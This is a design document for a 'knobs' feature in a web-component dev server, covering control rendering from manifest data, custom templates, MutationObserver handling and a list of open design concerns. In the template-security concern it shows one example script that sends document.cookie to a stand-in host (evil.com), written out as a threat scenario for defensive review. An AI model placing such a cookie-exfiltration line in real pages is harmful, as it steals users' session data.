## Knobs

Knobs should be a pure dev-server feature that reads from CEM data, rather than something embedded in the users' demo HTML. This keeps demos simple but requires a strategy to handle complex component compositions.

**Server-side rendering:**
1. Read manifest for element's attributes
2. Parse demo HTML to extract current values
3. For each attribute, render appropriate control:
   - Boolean → `<input type="checkbox">`
   - Union type (`'a' | 'b'`) → `<select>`
   - String → `<input type="text">`
   - Number → `<input type="number">`
   - Enum array → Multiple checkboxes

**Client-side behavior** (embedded `__cem-serve-chrome.js`):
```typescript
abstract class KnobChangeEvent {
  constructor(public value: unknown) {
    super('knob-change', { bubbles: true, cancellable: true });
  }
}

export class KnobAttributeChangeEvent extends KnobChangeEvent {
  constructor(
    public attribute: string,
    public value: string,
  ) {
    super(value);
  }
}

export class KnobPropertyChangeEvent extends KnobChangeEvent { /*...*/ }
export class KnobCssCustomPropertyChangeEvent extends KnobChangeEvent { /*...*/ }
// ...

class CemServeChrome extends HTMLElement {
  // ...

  constructor() {
    super();
    this.addEventListener('knob-change', this.#onKnobChange);
  }

  /**
   * Each knob type is a custom element e.g. cem-serve-knob-attribute
   * Each knob element class is responsible for constructing and
   * firing it's particular change event
   */
  #onKnobChange(event: KnobChangeEvent) {
    switch (event.knob.type) {
      case 'attribute':
        return demo.setAttribute(event.attribute, event.value);
      // etc...
    }
  }

  // ...
}
```

### Custom templates `--template-dir ./templates/`

**Template customization:** Users can override templates to:
HIGH PRIORITY: Add custom controls e.g. icon or color palette pickers for certain enum types
LOW PRIORITY: User bring their own design system components (`<rh-switch>`, `<pf-select>`)

- `demo.html` - Main demo page
- `knob-attribute-boolean.html` - Boolean attribute control (custom checkbox or switch)
- `knob-attribute-enum.html` - Enum/union type select (custom select or radio)
- `knob-attribute-string.html` - Text input
- `knob-attribute-number.html` - Number input
- Fallback to defaults if not provided

Custom templates will have to manage their own internal state, i.e.
- listening for the relevant change events from form inputs
- deriving the new values from the state of form inputs
- constructing and firing the knob-change events

so in most cases users will need to provide some script, probably via a wrapper custom element. typical usage will end up with something like

Default result:

```html
<cem-serve-chrome role="none"
                  knobs="{{.EnabledKnobs}}"
                  tag-name="{{.TagName}}">
  ...
  <cem-serve-knob-attribute>
    <template shadowrootmode="open">
      ...
      <cem-serve-switch></cem-serve-switch>
    </template>
  </cem-serve-knob-attribute>
</cem-serve-chrome>
```

Custom result

```html
<cem-serve-chrome role="none"
                  knobs="{{.EnabledKnobs}}"
                  tag-name="{{.TagName}}">
  ...
  <user-custom-knob-attribute>
    <template shadowrootmode="open">
      ...
      <my-switch></my-switch>
    </template>
  </user-custom-knob-attribute>
</cem-serve-chrome>
```

## Multiple Elements on the page

We'll use a mutation observer to watch for demo HTML changes, and add/remove knobs
as needed

## The Complex Case: Compositional Components

**Example scenario:**
```html
<pf-tabs>
  <pf-tab slot="tab" active>Users</pf-tab>
  <pf-tab-panel>Users content...</pf-tab-panel>

  <pf-tab slot="tab">Containers</pf-tab>
  <pf-tab-panel hidden>Containers content...</pf-tab-panel>

  <pf-tab slot="tab" disabled>Databases</pf-tab>
  <pf-tab-panel hidden>Databases content...</pf-tab-panel>
</pf-tabs>
```

## Proposed Knobs UI Structure

```
┌─────────────────────────────────────┐
│ KNOBS                               │
├─────────────────────────────────────┤
│ ▼ pf-tabs                           │  ← Primary element (expanded)
│   ├─ vertical: ☐                    │
│   ├─ box: ☐                         │
│   └─ ...                            │
│                                     │
│ ▶ pf-tab #1 "Users"                 │  ← Child instances (collapsed)
│ ▶ pf-tab #2 "Containers"            │
│ ▶ pf-tab #3 "Databases"             │
│ ▶ pf-tab-panel #1                   │
│ ▶ pf-tab-panel #2                   │
│ ▶ pf-tab-panel #3                   │
└─────────────────────────────────────┘
```

Clicking an accordion expands that element's knobs:
```
│ ▼ pf-tab #2 "Containers"            │
│   ├─ active: ☐                      │
│   ├─ disabled: ☐                    │
│   └─ ...                            │
```

### Implementation Macquette

#### Server Side
### Discovery Strategy

```go
// Server-side: identify all relevant elements in demo
func DiscoverKnobTargets(demoHTML string, manifest *CEM) []KnobTarget {
    // Parse demo HTML
    // Find all custom elements that exist in the manifest
    // Classify as:
    //   - Primary: root element or main demo subject
    //   - Secondary: children that are also in manifest
}
```

### Element Labelling

Priority for labeling child instances:
1. `id` attribute → "Tab: #home-tab"
2. Text content (trimmed) → "Tab: Users"
3. `aria-label` → "Tab: User Settings"
4. Slot name + index → "Tab (slot: tab) No. 2"
5. Fallback → "pf-tab No. 3"

### Knob Groups Template
```html
<details data-tag-name="{{.TagName}}" {{if .IsPrimaryElement}}open{{end}}>
  <summary>{{.TagName}}: {{.Label}}</summary>
  {{range .Attributes}}
    {{template "knob-attribute" .}}
  {{end}}
  <!-- etc for properties, slots, other knobs -->
</details>
```
### 3. UI Templates

Rather than async fetch calls and innerHTML every time we need to server render new knobs, the server should compute template elements for each knob type, to be appended
synchronously for each added knob group. These template elements are computed from the template files and contain DSD. Where possible, CEM content should be applied to the knobs via attributes (preferred, for simplicity) or slotted content (e.g. markdown descriptions)

#### Client Side

```ts
function isCustomElement(node: Node): node is HTMLElement {
  // is it a ce known to the registry?
}

type Knob = HTMLElement;

class CemServeChrome extends HTMLElement {
  // ...

  #elementKnobsMap = new WeakMap<HTMLElement, Knob>();

  #mo = new MutationObserver(this.#onDemoMutation);

  connectedCallback() {
    this.#mo.observe(this.#demo, {
      childList: true,
      subtree: true,
      attributes: true,
    });
  }

  #onDemoMutation(records: MutationRecord[]): void {
    records
      .flatMap(r => r.removedNodes)
      .filter(isCustomElement)
      .forEach(el => this.#removeKnobGroupForElement(element))
    records
      .flatMap(r => r.addedNodes)
      .filter(isCustomElement)
      .forEach(el => this.#appendKnobGroupForElement(element))
  }

  #removeKnobGroupForElement(element: HTMLElement) {
    this.#elementKnobsMap.get(element)?.remove();
    this.#elementKnobsMap.delete(element);
  }

  #appendKnobGroupForElement(element: HTMLElement) {
    const knob = this.#createKnobGroupForElement(element);
    // determine according to new source order which knob-set-for-element preceeds the new one
    const beforeKnob = /* ... */
    beforeKnob.after(knob);
    this.#elementKnobsMap.set(element, knob);
  }

  /**
   * Constructs a client-side instance of the knob for this element
   * Based on tag name and attributes, using <template> elements generated 
   * server side for each knob type
   */
  #createKnobGroupForElement(element: HTMLElement): HTMLElement {
    // ...
  }
}
```

### Config

Under `.serve.knobs`

```yaml
enabled: true
templates: ./templates/knobs/*.html
```

---

## Open Questions & Concerns

### Mutation Observer Performance
**Issue:** MutationObserver watching entire demo subtree (lines 219-223):
```typescript
this.#mo.observe(this.#demo, {
  childList: true,
  subtree: true,      // ⚠️ Expensive with deep trees
  attributes: true,   // ⚠️ Triggers on every attribute change
});
```

**Performance concerns:**
1. **Expensive observation** - `subtree: true` monitors ALL descendants
2. **Attribute changes trigger observer** - Setting attribute via knob triggers observer, which may update knobs, creating potential infinite loop
3. **No throttling** - Rapid DOM changes cause repeated knob updates

**Example footgun:**
```typescript
// Knob sets attribute
element.setAttribute('color', 'red');

// Triggers mutation observer
#onDemoMutation() {
  // Re-creates knob, which may set attribute again
  // Infinite loop risk!
}
```

**Recommendation:**
- Add guard against reentrant mutations (flag to skip observer during knob updates)
- Throttle observer callbacks (debounce by 50ms)
- Consider observing only direct children, not entire subtree

### Custom Template Security
**Issue:** Users provide custom templates (lines 61-84) which means:
- Arbitrary HTML/JS injection into server-rendered page
- No specification for template sanitization
- Security boundary unclear

**Attack scenario:**
```html
<!-- User's knob-attribute-boolean.html -->
<script>
  // Can access entire page, steal data, etc.
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```

**Questions:**
- Are custom templates trusted or untrusted?
- Should templates be sandboxed?
- What CSP headers should be set?

**Recommendation:**
- Document that custom templates are trusted (user's own code)
- Add CSP headers to mitigate XSS from demos
- Provide template validation/linting tool

### Custom Template Testing
**Issue:** Users can provide arbitrary custom templates but no testing strategy.
- How to test user templates integrate correctly?
- How to validate templates fire correct events?
- How to ensure templates don't break chrome?

**Recommendation:**
- Provide template testing harness
- Document template contract (required events, structure)
- Add validation that checks templates meet contract

### Element Discovery in Complex Shadow DOMs
**Issue:** Knob discovery parses demo HTML (line 169) but:
- What if elements are in shadow DOM?
- What if elements are dynamically created?
- What if elements use closed shadow roots?

**Example:**
```html
<!-- Demo HTML -->
<my-container>
  <template shadowrootmode="closed">
    <pf-button>Hidden from parser</pf-button>
  </template>
</my-container>
```

**Recommendation:**
- Document that knobs only work for light DOM elements initially
- Add "Refresh knobs" button for dynamic content
- Consider using MutationObserver to detect shadow DOM creation

### Element Labeling Edge Cases
**Issue:** Priority for labeling (lines 180-185) has edge cases:
1. **Empty text content** - Element has `textContent` but it's all whitespace
2. **Long text content** - 1000 character text node, how much to show?
3. **Multiple aria-labels** - Nested elements with different labels
4. **Special characters** - Label contains `<`, `>`, `"` (XSS risk in template)

**Recommendation:**
- Trim and truncate text content (max 50 chars)
- Escape HTML entities in labels
- Prefer closest aria-label if multiple exist

### Multiple Elements: Source Order Maintenance
**Issue:** Line 245 mentions "determine according to new source order which knob-set-for-element precedes the new one" but no algorithm specified.

**Challenge:** When element added to middle of demo, where to insert knob?
```html
<!-- Before -->
<pf-button id="a"></pf-button>
<pf-button id="c"></pf-button>

<!-- After: b inserted between a and c -->
<pf-button id="a"></pf-button>
<pf-button id="b"></pf-button>  <!-- New! -->
<pf-button id="c"></pf-button>

<!-- Knobs panel should show: a, b, c (in order) -->
```

**Recommendation:**
- Walk demo DOM in tree order, collect all custom elements
- Build ordered list of knob elements matching demo order
- Insert new knobs at correct position in list

### Knob State Synchronization
**Missing:** How knobs reflect current element state:
- What if attribute changes via script (not knob)?
- What if property changes internally?
- What if multiple knobs control same element?

**Example:**
```javascript
// User code changes attribute
element.setAttribute('color', 'blue');

// Knob still shows 'red' - out of sync!
```

**Recommendation:**
- Add MutationObserver for attribute changes (separate from DOM structure observer)
- Update knob UI when element attributes change
- Or: make knobs write-only (don't sync back)

### Server-Side Template Data Flow
**Issue:** Templates receive data from server (line 189-195) but data model is unclear:
- What's the full shape of template data?
- How are attribute types communicated?
- What about default values?

**Example needed:**
```go
type KnobGroupData struct {
    TagName         string
    Label           string
    IsPrimaryElement bool
    Attributes      []AttributeKnobData
    Properties      []PropertyKnobData
    // ...
}

type AttributeKnobData struct {
    Name         string
    Type         string // "boolean" | "string" | "number" | "enum"
    CurrentValue string
    EnumValues   []string // for type=enum
    Description  string
}
```

**Recommendation:** Document complete data model for templates.

### Performance with Many Elements
**Issue:** Complex demos may have many elements (e.g., data table with 100 rows).
- 100 elements × 10 knobs = 1000 controls
- DOM size, memory, interaction lag

**Recommendation:**
- Collapse knobs by default (only primary expanded)
- Virtualize knob list if >50 elements
- Add search/filter for knobs

### Type Inference Limitations
**Issue:** Line 133 mentions "Type inference from CEM" but:
- Not all types map to HTML inputs (object, array, function)
- Union types can be complex (`'a' | 'b' | SomeType`)
- TypeScript types may not match runtime values

**Example complex type:**
```typescript
type Variant = 'primary' | 'secondary' | { custom: string };
```

**Recommendation:**
- Document supported type mappings
- Fallback to text input for complex types
- Allow custom knob types via templates

### Testing Strategy
**Missing:** How to test knobs feature:
- Server-side discovery logic
- Template rendering
- Client-side event handling
- Mutation observer behavior

**Recommendation:** Fixture-based tests (per CLAUDE.local.md):
```
server/knobs/test-fixtures/
  ├── simple/
  │   ├── demo.html
  │   ├── manifest.json
  │   └── expected-knobs.html
  ├── complex-composition/
  │   ├── demo.html (nested elements)
  │   ├── manifest.json
  │   └── discovery-test.go
  └── mutation-observer/
      ├── demo.html
      ├── test.js (simulates DOM changes)
      └── observer-test.go
```